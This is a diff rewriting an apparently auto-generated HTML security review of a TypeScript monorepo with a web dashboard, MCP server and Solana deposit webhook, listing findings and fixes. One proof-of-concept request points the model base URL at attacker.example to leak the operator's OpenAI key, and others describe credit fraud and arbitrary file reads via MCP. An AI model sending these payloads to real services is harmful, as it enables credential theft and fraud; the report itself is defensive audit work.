@@ -1,101 +1,530 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Review and Iterate — ASST (2026-04-12)</title>
-  <style>
-    body { font-family: system-ui, sans-serif; line-height: 1.5; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; color: #1a1a1a; }
-    h1 { font-size: 1.35rem; }
-    h2 { font-size: 1.1rem; margin-top: 1.75rem; }
-    table { border-collapse: collapse; width: 100%; font-size: 0.95rem; }
-    th, td { text-align: left; border: 1px solid #ccc; padding: 0.4rem 0.6rem; }
-    th { background: #f4f4f4; }
-    .grade { font-weight: 600; }
-    .note { background: #f8f4e8; padding: 0.75rem 1rem; border-radius: 6px; }
-    code { font-size: 0.88em; }
-    ul { padding-left: 1.25rem; }
-  </style>
+<meta charset="utf-8" />
+<title>ARES / ASST — Code Review (2026-05-03)</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<style>
+  :root {
+    --bg: #0b0d12;
+    --panel: #11141b;
+    --panel-2: #161b25;
+    --border: #232936;
+    --text: #e7ebf3;
+    --muted: #94a3b8;
+    --accent: #7dd3fc;
+    --crit: #ff5572;
+    --high: #ff9d3d;
+    --med:  #f4d35e;
+    --low:  #84d68a;
+    --info: #93c5fd;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font: 14px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+  header {
+    padding: 32px 40px 24px;
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, #0d1118, #0b0d12);
+  }
+  header h1 { margin: 0 0 6px; font-size: 22px; letter-spacing: -0.01em; }
+  header .meta { color: var(--muted); font-size: 13px; }
+  main { padding: 24px 40px 64px; max-width: 1180px; margin: 0 auto; }
+  h2 { margin: 32px 0 12px; font-size: 17px; letter-spacing: -0.01em; }
+  h3 { margin: 24px 0 8px; font-size: 14px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; }
+  .grid { display: grid; gap: 12px; grid-template-columns: repeat(4, minmax(0,1fr)); }
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+  }
+  .card .label { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; }
+  .card .value { font-size: 22px; font-weight: 600; }
+  .card.crit .value { color: var(--crit); }
+  .card.high .value { color: var(--high); }
+  .card.med .value  { color: var(--med); }
+  .card.low .value  { color: var(--low); }
+  .card.grade .value { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 16px 18px; margin-bottom: 16px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th, td { padding: 10px 8px; text-align: left; vertical-align: top; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 500; font-size: 12px; text-transform: uppercase; letter-spacing: 0.06em; }
+  tr:last-child td { border-bottom: 0; }
+  td.id { font-family: ui-monospace, monospace; color: var(--muted); white-space: nowrap; }
+  td.file { font-family: ui-monospace, monospace; color: var(--accent); white-space: nowrap; max-width: 320px; overflow-wrap: anywhere; }
+  .pill {
+    display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 999px;
+    text-transform: uppercase; letter-spacing: 0.06em; font-weight: 600;
+  }
+  .pill.crit { background: rgba(255,85,114,0.14); color: var(--crit); }
+  .pill.high { background: rgba(255,157,61,0.14); color: var(--high); }
+  .pill.med  { background: rgba(244,211,94,0.14); color: var(--med); }
+  .pill.low  { background: rgba(132,214,138,0.14); color: var(--low); }
+  details { background: var(--panel-2); border: 1px solid var(--border); border-radius: 10px; padding: 12px 14px; margin: 8px 0; }
+  details > summary { cursor: pointer; font-weight: 600; }
+  pre, code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  pre { background: var(--panel-2); border: 1px solid var(--border); border-radius: 8px; padding: 12px; overflow-x: auto; font-size: 12.5px; line-height: 1.5; }
+  code { font-size: 12.5px; }
+  .verdict {
+    display: flex; align-items: center; gap: 12px;
+    background: rgba(255,85,114,0.08); border: 1px solid rgba(255,85,114,0.4);
+    border-radius: 10px; padding: 14px 16px; margin-bottom: 20px;
+  }
+  .verdict .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--crit); }
+  .verdict strong { color: var(--crit); }
+  ul { padding-left: 20px; }
+  ul li { margin: 4px 0; }
+  .muted { color: var(--muted); }
+  a { color: var(--accent); }
+</style>
 </head>
 <body>
-  <h1>Review and Iterate — ASST</h1>
-  <p><strong>Date:</strong> 2026-04-12 &middot; <strong>Skill:</strong> review-and-iterate (Solana-oriented)</p>
 
-  <div class="note">
-    <strong>Scope reality:</strong> This workspace contains <strong>no Solana on-chain program</strong>
-    (no <code>Anchor.toml</code>, no <code>programs/</code>, no <code>*.rs</code>). P0 checks from
-    <code>security-basics.md</code> (signer, PDA, checked math, reinitialization, etc.) do not apply to Rust code here.
-    The review below scores the <strong>available</strong> codebase (<code>deepagentsjs/</code> TypeScript monorepo) and records blockers for a literal “mainnet program” launch.
+<header>
+  <h1>ARES / ASST — Code Review</h1>
+  <div class="meta">2026-05-03 · review-and-iterate · scope: <code>packages/engine</code>, <code>apps/web</code>, <code>apps/mcp-server</code>, <code>apps/chain-intake</code></div>
+</header>
+
+<main>
+
+<div class="verdict">
+  <div class="dot"></div>
+  <div>
+    <strong>Verdict: Request Changes — not ready for mainnet.</strong>
+    Six critical (P0) issues block launch, including server-side request forgery + LLM-API-key
+    exfiltration, bundle credit fraud, SIWS phishing replay, a billing race, and arbitrary
+    file r/w via MCP. Close P0+P1 before any production traffic.
   </div>
+</div>
 
-  <h2>Grades (rubric-aligned)</h2>
-  <table>
-    <thead>
-      <tr><th>Dimension</th><th>Grade</th><th>Notes</th></tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td>Security (3×)</td>
-        <td class="grade">C</td>
-        <td>No programs to verify; dependency issues mitigated via pnpm overrides (axios, langsmith). See CSO report.</td>
-      </tr>
-      <tr>
-        <td>Correctness (2×)</td>
-        <td class="grade">B</td>
-        <td>Not exhaustively proven; upstream library patterns assumed sound for happy paths.</td>
-      </tr>
-      <tr>
-        <td>Error handling (2×)</td>
-        <td class="grade">B</td>
-        <td>Typical TS patterns; not audited line-by-line.</td>
-      </tr>
-      <tr>
-        <td>Testing (1.5×)</td>
-        <td class="grade">B</td>
-        <td>Monorepo has unit/integration tests and CI (Vitest, matrix Node).</td>
-      </tr>
-      <tr>
-        <td>Organization (1×)</td>
-        <td class="grade">B</td>
-        <td>Clear libs/providers split.</td>
-      </tr>
-      <tr>
-        <td>Documentation (0.5×)</td>
-        <td class="grade">B</td>
-        <td>READMEs, <code>.env.example</code> in examples.</td>
-      </tr>
-    </tbody>
-  </table>
-  <p><strong>Overall (informal):</strong> <span class="grade">B–C</span> — driven by “no chain” + supply-chain remediation.</p>
-  <p><strong><code>review.ready_for_mainnet</code>:</strong> <code>false</code> (nothing on-chain to deploy).</p>
+<div class="grid">
+  <div class="card grade"><div class="label">Security</div><div class="value">D</div></div>
+  <div class="card grade"><div class="label">Quality</div><div class="value">B-</div></div>
+  <div class="card crit"><div class="label">Critical</div><div class="value">6</div></div>
+  <div class="card high"><div class="label">High</div><div class="value">6</div></div>
+</div>
+<div class="grid" style="margin-top:12px;">
+  <div class="card med"><div class="label">Medium</div><div class="value">5</div></div>
+  <div class="card low"><div class="label">Low / Hardening</div><div class="value">3</div></div>
+  <div class="card"><div class="label">Test files</div><div class="value">11</div></div>
+  <div class="card"><div class="label">TS LoC reviewed</div><div class="value">~14k</div></div>
+</div>
 
-  <h2>Findings and fixes</h2>
-  <table>
-    <thead>
-      <tr><th>Severity</th><th>Category</th><th>Fix</th></tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td>High</td>
-        <td>Scope</td>
-        <td>Add an Anchor program in this repo or run this skill against the repo that contains <code>programs/</code>.</td>
-      </tr>
-      <tr>
-        <td>High</td>
-        <td>Supply chain</td>
-        <td>Applied <code>pnpm.overrides</code> in <code>deepagentsjs/package.json</code>: <code>axios@&lt;1.15.0 → 1.15.0</code>, <code>langsmith@&lt;=0.5.17 → 0.5.18</code>. Run <code>pnpm install && pnpm audit</code>.</td>
-      </tr>
-      <tr>
-        <td>Low</td>
-        <td>Hygiene</td>
-        <td>Added root <code>.gitignore</code> for <code>.env</code> so future commits do not leak secrets.</td>
-      </tr>
-    </tbody>
-  </table>
+<h2>Summary</h2>
+<div class="panel">
+  The codebase is a well-structured pnpm monorepo: a multi-agent orchestration engine
+  (<code>@ares/engine</code>), a Next.js dashboard with SIWS authentication and a USDC top-up
+  flow, an MCP server exposing engine tools to AI clients, and a Helius webhook that turns
+  on-chain treasury deposits into account credits. The architecture is sensible — read-only
+  vs mutating tools, sandbox backends, IP + wallet rate limiting, in-process billing ledger.
+  However, the security posture has not yet caught up to the surface area. Three independent
+  paths to <em>full compromise of LLM credentials or to free credits</em> exist today, and
+  the MCP server exposes unrestricted filesystem r/w via SARIF tooling. None of these are
+  hard to fix; all of them are show-stoppers.
+</div>
 
-  <h2>Phase 3 (Launch) skills</h2>
-  <p>When you have a Solana program in scope and grades improve: consider <strong>deploy-to-mainnet</strong>, <strong>create-pitch-deck</strong>, or <strong>submit-to-hackathon</strong> per the skill handoff — not applicable until on-chain code exists.</p>
+<h2>Critical issues (P0) — block production</h2>
+<table>
+  <thead>
+    <tr><th>#</th><th>Issue</th><th>File</th><th>Severity</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="id">001</td>
+      <td>SSRF + LLM API-key exfiltration via user-controlled <code>model</code> baseUrl on <code>/api/chat</code> and <code>/api/scan</code></td>
+      <td class="file">apps/web/app/api/chat/route.ts:40, packages/engine/src/config/model-factory.ts:142</td>
+      <td><span class="pill crit">Critical</span></td>
+    </tr>
+    <tr>
+      <td class="id">002</td>
+      <td>Bundle credit fraud: deposit handler credits full bundle for any positive transfer; no payment-amount check</td>
+      <td class="file">apps/chain-intake/src/credits-on-deposit.ts:124</td>
+      <td><span class="pill crit">Critical</span></td>
+    </tr>
+    <tr>
+      <td class="id">003</td>
+      <td>SIWS phishing: <code>/api/auth/verify</code> never validates the signed <code>Domain:</code> against the request host</td>
+      <td class="file">apps/web/app/api/auth/verify/route.ts:42</td>
+      <td><span class="pill crit">Critical</span></td>
+    </tr>
+    <tr>
+      <td class="id">004</td>
+      <td>Public scan billing race: <code>runFullScan</code> is fire-and-forget, but the user is debited on the immediate 200 OK</td>
+      <td class="file">apps/web/app/api/scan/route.ts:47, 124</td>
+      <td><span class="pill crit">Critical</span></td>
+    </tr>
+    <tr>
+      <td class="id">005</td>
+      <td>MCP <code>asst_merge_sarif</code>: arbitrary file read + write via attacker-controlled <code>inputPaths</code> / <code>outputPath</code></td>
+      <td class="file">apps/mcp-server/src/server.ts:170</td>
+      <td><span class="pill crit">Critical</span></td>
+    </tr>
+    <tr>
+      <td class="id">006</td>
+      <td>MCP <code>asst_write_assurance_manifest</code>: client-controlled <code>repoRoot</code> / <code>outDir</code> fed to <code>execFileAsync('pnpm', ...)</code></td>
+      <td class="file">apps/mcp-server/src/server.ts:280</td>
+      <td><span class="pill crit">Critical</span></td>
+    </tr>
+  </tbody>
+</table>
 
-  <p style="margin-top:2rem;font-size:0.85rem;color:#555;">Artifact: <code>.superstack/review-report.html</code> &middot; Context: <code>.superstack/build-context.md</code></p>
+<h2>High-severity issues (P1) — fix before launch</h2>
+<table>
+  <thead>
+    <tr><th>#</th><th>Issue</th><th>File</th><th>Severity</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="id">007</td>
+      <td>JWT secret accepts arbitrarily weak strings (no min length / entropy)</td>
+      <td class="file">apps/web/lib/auth/session-secret.ts</td>
+      <td><span class="pill high">High</span></td>
+    </tr>
+    <tr>
+      <td class="id">008</td>
+      <td>Helius webhook secret: timing-leaky <code>!==</code> compare + <code>?secret=</code> query fallback (logs)</td>
+      <td class="file">apps/chain-intake/src/server.ts:32</td>
+      <td><span class="pill high">High</span></td>
+    </tr>
+    <tr>
+      <td class="id">009</td>
+      <td><code>readFileTool</code> root is read from <code>ASST_REPO_ROOT</code>, NOT from <code>Orchestrator(repoRoot)</code>; falls back to <code>process.cwd()</code></td>
+      <td class="file">packages/engine/src/tools/readonly.ts:13</td>
+      <td><span class="pill high">High</span></td>
+    </tr>
+    <tr>
+      <td class="id">010</td>
+      <td><code>/api/scan</code> accepts arbitrary <code>body.target</code>; free-tier scans usable on any path string</td>
+      <td class="file">apps/web/app/api/scan/route.ts:36</td>
+      <td><span class="pill high">High</span></td>
+    </tr>
+    <tr>
+      <td class="id">011</td>
+      <td>In-memory <code>rateBuckets</code> Map: not multi-replica safe and never evicts (memory growth)</td>
+      <td class="file">apps/web/lib/api.ts:27</td>
+      <td><span class="pill high">High</span></td>
+    </tr>
+    <tr>
+      <td class="id">012</td>
+      <td><code>asst_solana_rpc_read</code> accepts arbitrary JSON-RPC method (despite "read-only" label)</td>
+      <td class="file">apps/mcp-server/src/server.ts:244</td>
+      <td><span class="pill high">High</span></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Medium / Low</h2>
+<table>
+  <thead>
+    <tr><th>#</th><th>Issue</th><th>File</th><th>Severity</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="id">013</td>
+      <td>Edge middleware fails open on Redis errors → site-wide rate-limit bypass during outages</td>
+      <td class="file">apps/web/middleware.ts:66</td>
+      <td><span class="pill med">Medium</span></td>
+    </tr>
+    <tr>
+      <td class="id">014</td>
+      <td>No security headers (CSP, X-Frame-Options, etc.) configured in next.config.ts</td>
+      <td class="file">apps/web/next.config.ts</td>
+      <td><span class="pill med">Medium</span></td>
+    </tr>
+    <tr>
+      <td class="id">015</td>
+      <td><code>clientNonce</code> not tracked in deposit attribution (compounds with #002 in fraud)</td>
+      <td class="file">apps/chain-intake/src/credits-on-deposit.ts</td>
+      <td><span class="pill med">Medium</span></td>
+    </tr>
+    <tr>
+      <td class="id">016</td>
+      <td>SIWS nonce store falls back to in-memory Map without Redis → broken SIWS in multi-replica</td>
+      <td class="file">apps/web/lib/auth/nonce-store.ts</td>
+      <td><span class="pill med">Medium</span></td>
+    </tr>
+    <tr>
+      <td class="id">017</td>
+      <td>Engine pins <code>typescript@^6.0.2</code>; web pins <code>^5.7.0</code>. TS 6 not yet GA — install drifts.</td>
+      <td class="file">packages/engine/package.json:39</td>
+      <td><span class="pill med">Medium</span></td>
+    </tr>
+    <tr>
+      <td class="id">018</td>
+      <td><code>findAsstMemoInTx</code> walks every string in the tx — over-broad parsing surface</td>
+      <td class="file">apps/chain-intake/src/credits-on-deposit.ts:31</td>
+      <td><span class="pill low">Low</span></td>
+    </tr>
+    <tr>
+      <td class="id">019</td>
+      <td>Skills retrieval cache <code>.asst/skills-index.json</code> not validated after parse</td>
+      <td class="file">packages/engine/src/skills/retrieval.ts</td>
+      <td><span class="pill low">Low</span></td>
+    </tr>
+    <tr>
+      <td class="id">020</td>
+      <td>Test coverage thin: 5 engine tests for ~4.7kLoC; billing routes have zero integration tests</td>
+      <td class="file">packages/engine/src/__tests__</td>
+      <td><span class="pill low">Low</span></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Detail + suggested fixes</h2>
+
+<details open>
+<summary>#001 — SSRF + API key exfiltration via user <code>model</code></summary>
+<p>
+Both <code>POST /api/chat</code> and <code>POST /api/scan</code> read <code>body.model</code> as
+a string, pass it to <code>createPublicOrchestrator({ model })</code>, which calls
+<code>parseModelId(raw)</code>. For providers <code>openai</code>, <code>ollama</code>, and
+<code>local</code>, the parser splits on <code>@</code> and returns a <code>baseUrl</code>
+that is then handed verbatim to <code>ChatOpenAI({ configuration: { baseURL } })</code>.
+The resulting HTTP request is a normal OpenAI-style chat-completion <em>including</em> the
+configured <code>OPENAI_API_KEY</code> in the <code>Authorization: Bearer …</code> header.
+</p>
+<p><strong>Proof of concept (no exploitation needed — the bug is in the routing layer):</strong></p>
+<pre><code>POST /api/chat HTTP/1.1
+Content-Type: application/json
+
+{"prompt":"hi","model":"openai:gpt-4o-mini@http://attacker.example/v1"}</code></pre>
+<p>The server makes an outbound POST to <code>http://attacker.example/v1/chat/completions</code>
+with the operator's OpenAI key. <strong>Severity:</strong> full provider key compromise.</p>
+<p><strong>Fix:</strong></p>
+<pre><code>// apps/web/lib/engine-factory.ts
+const ALLOWED_MODELS = new Set([
+  "google:gemini-2.5-flash",
+  "openrouter:meta-llama/llama-3.3-70b-instruct",
+  // ... explicit allowlist
+]);
+
+export function createPublicOrchestrator(opts: PublicOrchestratorOptions = {}) {
+  const repoRoot = opts.repoRoot ?? resolveRepoRoot();
+  const model = opts.model && ALLOWED_MODELS.has(opts.model) ? opts.model : undefined;
+  return new Orchestrator(repoRoot, { model });
+}</code></pre>
+<p>Optionally, change <code>parseModelId</code> to refuse <code>@&lt;baseUrl&gt;</code> when
+called from the public surface (e.g. via a flag or a separate <code>parsePublicModelId</code>
+that hard-fails on user-supplied baseUrls).</p>
+</details>
+
+<details>
+<summary>#002 — Bundle credit fraud (no payment-amount check)</summary>
+<p>
+<code>applyBillingDeposits</code> only checks that <code>lamports &gt; 0n</code> for SOL or
+<code>amt &gt; 0</code> for USDC, then credits <code>BUNDLE_UNITS[bundleId]</code>:
+</p>
+<pre><code>// apps/chain-intake/src/credits-on-deposit.ts:124-152
+for (const row of nativeTransfers(tx)) {
+  if (to === treasury &amp;&amp; from === parsedMemo.userWallet &amp;&amp; lamports &gt; 0n) {
+    sourceOk = true; // 1 lamport == "growth bundle paid in full"
+    break;
+  }
+}</code></pre>
+<p>An attacker pays 1 lamport (~$0) to the treasury with memo
+<code>ASST:&lt;self&gt;:growth:nonce</code>, gets credited 1,100 units (priced at $10 USDC).
+At scale, this drains the operator's LLM/cost budget without any USDC inflow.</p>
+<p><strong>Fix:</strong></p>
+<pre><code>// apps/chain-intake/src/bundle-units.ts (extend)
+export const BUNDLE_PRICING: Record&lt;string, { units: number; usdc: number; sol: number }&gt; = {
+  starter: { units: 100,  usdc: 1,  sol: 0.005  /* set live SOL/USDC peg */ },
+  growth:  { units: 1100, usdc: 10, sol: 0.05 },
+};
+
+// apps/chain-intake/src/credits-on-deposit.ts (sketch)
+const required = BUNDLE_PRICING[parsedMemo.bundleId];
+if (!required) { skipped++; continue; }
+const tolerance = 0.005; // 0.5% slack for USDC fee/rounding
+
+if (paidUsdc &gt;= required.usdc * (1 - tolerance)) sourceOk = true;
+else if (paidLamports &gt;= BigInt(Math.floor(required.sol * 1e9 * (1 - tolerance)))) sourceOk = true;
+else sourceOk = false;</code></pre>
+<p>Also add a structured <code>warn</code> log on underpayment so legitimate edge cases (e.g. SOL price drift) are visible.</p>
+</details>
+
+<details>
+<summary>#003 — SIWS phishing: missing Domain validation</summary>
+<p>
+<code>extractExpirationFromSignedMessage</code> and
+<code>extractNonceFromSignedMessage</code> are called on <code>signedMessage</code>, but the
+<code>Domain:</code> line is never extracted or compared. A user who signs a SIWS challenge
+on a malicious site that copies our message format produces a signature that is
+indistinguishable from one produced on our site — and <code>verifyEd25519WalletSignature</code>
+will accept it as long as the nonce hasn't been seen yet (which it hasn't, because the
+attacker just relayed the user's signed payload to us).</p>
+<p><strong>Fix:</strong></p>
+<pre><code>// apps/web/lib/auth/siws-message.ts
+export function extractDomainFromSignedMessage(s: string): string | null {
+  const m = s.match(/^Domain:\s*(\S+)/m);
+  return m ? m[1] : null;
+}
+
+// apps/web/app/api/auth/verify/route.ts (after expiry/nonce checks)
+const domain = extractDomainFromSignedMessage(signedMessage);
+const expected = process.env.ASST_PUBLIC_HOST ?? new URL(req.url).host;
+if (domain !== expected) {
+  return apiError(requestId, "BAD_REQUEST", "Domain mismatch.", 400);
+}</code></pre>
+<p>Also pin Statement, URI, and an Issued-At drift bound (e.g. ≤2min) for completeness.</p>
+</details>
+
+<details>
+<summary>#004 — Scan race / billing inconsistency</summary>
+<p>
+<code>invokeScan</code> spawns the orchestrator without <code>await</code>, returns 200, and
+the caller settles the debit because <code>res.status === 200</code> always. The result
+is: charge first, hope it succeeds.</p>
+<p><strong>Fix sketch:</strong></p>
+<pre><code>// 1. Persist a run row up front
+const runId = await insertRunPending({ pool, wallet, target });
+// 2. Background: run scan, settle/refund, write findings
+queueWork(async () =&gt; {
+  try {
+    const results = await ares.runFullScan(...);
+    await persistFindings(pool, runId, results);
+    await settleDebit(pool, debitId);
+  } catch (err) {
+    await refundDebit(pool, debitId);
+    await markRunFailed(pool, runId, err);
+  }
+});
+// 3. Return the runId so the client can poll /api/scan/:id/status
+return apiSuccess(requestId, { runId, status: "queued" });</code></pre>
+</details>
+
+<details>
+<summary>#005 / #006 — MCP arbitrary file r/w</summary>
+<p>
+The MCP server is the <em>most privileged</em> surface in this codebase — it runs locally
+with the operator's full filesystem access. Both <code>asst_merge_sarif</code> and
+<code>asst_write_assurance_manifest</code> accept arbitrary paths from the client. A malicious
+or compromised MCP client (e.g. a hostile rule injected into a Cursor session) can:</p>
+<ul>
+  <li>Read any file the server can read (SSH keys, .env, browser cookies).</li>
+  <li>Overwrite any file the server can write (config, code, ~/.zshrc).</li>
+  <li>Run <code>pnpm</code> with <code>--cwd</code> = anywhere with package.json scripts.</li>
+</ul>
+<p><strong>Fix:</strong></p>
+<pre><code>// apps/mcp-server/src/server.ts
+const MCP_REPO_ROOT = resolve(process.env.ASST_MCP_REPO_ROOT ?? process.cwd());
+
+function withinRoot(p: string): string {
+  const abs = isAbsolute(p) ? resolve(p) : resolve(MCP_REPO_ROOT, p);
+  const rel = relative(MCP_REPO_ROOT, abs);
+  if (rel.startsWith("..") || isAbsolute(rel)) {
+    throw new Error(`path escapes MCP repo root: ${p}`);
+  }
+  return abs;
+}
+
+// asst_merge_sarif handler:
+const safeInputs  = args.inputPaths.map(withinRoot);
+const safeOutput  = withinRoot(args.outputPath);
+
+// asst_write_assurance_manifest handler:
+// pin repoRoot/deepagentsjsRoot to MCP_REPO_ROOT — let only outDir be client-supplied
+// AND validate it via withinRoot.</code></pre>
+</details>
+
+<details>
+<summary>#007 — JWT secret length</summary>
+<pre><code>// apps/web/lib/auth/session-secret.ts
+export function getJwtSecretBytes(): Uint8Array | null {
+  const raw = process.env.ASST_SESSION_SECRET?.trim();
+  if (!raw) return null;
+  if (/^[0-9a-fA-F]{64}$/.test(raw)) {
+    return Uint8Array.from(Buffer.from(raw, "hex"));
+  }
+  if (raw.length &lt; 32) {
+    throw new Error("ASST_SESSION_SECRET must be at least 32 bytes (or 64 hex chars).");
+  }
+  return new TextEncoder().encode(raw);
+}</code></pre>
+<p>Document <code>openssl rand -hex 32</code> in <code>.env.example</code>.</p>
+</details>
+
+<details>
+<summary>#008 — Webhook secret comparison + query fallback</summary>
+<pre><code>// apps/chain-intake/src/server.ts
+import { timingSafeEqual } from "node:crypto";
+function eqSafe(a: string, b: string): boolean {
+  const ab = Buffer.from(a), bb = Buffer.from(b);
+  return ab.length === bb.length &amp;&amp; timingSafeEqual(ab, bb);
+}
+// ...
+if (secret) {
+  const auth = c.req.header("authorization");
+  const bearer = auth?.startsWith("Bearer ") ? auth.slice(7) : "";
+  if (!eqSafe(bearer, secret)) {
+    return c.json({ error: "unauthorized" }, 401);
+  }
+}</code></pre>
+<p>Drop the <code>?secret=</code> fallback. If Helius supports HMAC signing, prefer that.</p>
+</details>
+
+<details>
+<summary>#009 — readFileTool root binding</summary>
+<p>The orchestrator's <code>repoRoot</code> never reaches the tool. Easiest fix:</p>
+<pre><code>// apps/web/lib/engine-factory.ts (top of module)
+import { resolveRepoRoot } from "./paths";
+if (!process.env.ASST_REPO_ROOT) {
+  process.env.ASST_REPO_ROOT = resolveRepoRoot();
+}</code></pre>
+<p>
+Better fix: refactor <code>readFileTool</code> into a factory <code>makeReadFileTool(repoRoot)</code>
+and have the orchestrator instantiate it with its constructor argument.
+</p>
+</details>
+
+<h2>What looks good</h2>
+<ul>
+  <li>Provider model factory is well-typed; explicit error messages when env vars are missing.</li>
+  <li>SIWS implementation correctly uses <code>tweetnacl</code> + <code>bs58</code>; nonce
+    consumption is idempotent (single-use Redis token).</li>
+  <li>Read-only vs mutating tool separation is a sensible boundary; sandbox factory
+    (<code>HostShell</code> vs <code>Docker</code>) is a real defense-in-depth layer.</li>
+  <li>Idempotent webhook ingestion via <code>(signature, slot)</code> conflict handling — good
+    pattern for at-least-once delivery.</li>
+  <li>Test boundary present: <code>readonly-boundary.test.ts</code>, SIWS round-trip,
+    deposit memo parser. The skeleton for billing tests already exists; just needs the
+    debit-settle-refund branches fleshed out.</li>
+  <li><code>better-sqlite3</code>, <code>pg</code>, <code>pg-native</code> correctly listed in
+    <code>serverExternalPackages</code> + webpack externals — historically a Next.js footgun
+    that was solved correctly here.</li>
+  <li>Public engine factory enforces <code>ASST_ALLOW_WRITE = "0"</code> at module load when
+    <code>ASST_WEB_ALLOW_WRITE !== "1"</code> — good; mutating tools cannot accidentally be
+    mounted.</li>
+</ul>
+
+<h2>Recommended fix order</h2>
+<ol>
+  <li><strong>Day 1 — close P0 holes:</strong> #001, #002, #003, #004, #005, #006, #007.</li>
+  <li><strong>Day 2 — defense in depth:</strong> #008, #009, #010, #011, #012, #014.</li>
+  <li><strong>Pre-launch:</strong> #013, #015, #016, #017, #020.</li>
+</ol>
+
+<h2>QEDGen recommendation</h2>
+<p>
+The billing state machine is exactly the kind of system where machine-checked invariants
+pay for themselves: conservation (<em>sum of credits − debits = balance</em>), one-shot
+settle (<em>a debit cannot be both settled and refunded</em>), and replay-safety
+(<em>same tx_sig credits at most once</em>). After the P0 fixes, run
+<code>qedgen</code> over <code>apps/web/lib/billing/ledger.ts</code> +
+<code>apps/chain-intake/src/credits-on-deposit.ts</code> to lock these properties in.
+</p>
+
+<p class="muted" style="margin-top: 32px; font-size: 12px;">
+  Generated by <code>review-and-iterate</code> (Phase 2 — Build) with the
+  <code>code-review</code> skill rubric. Source: <code>.superstack/build-context.md</code>.
+</p>
+
+</main>
+
 </body>
 </html>
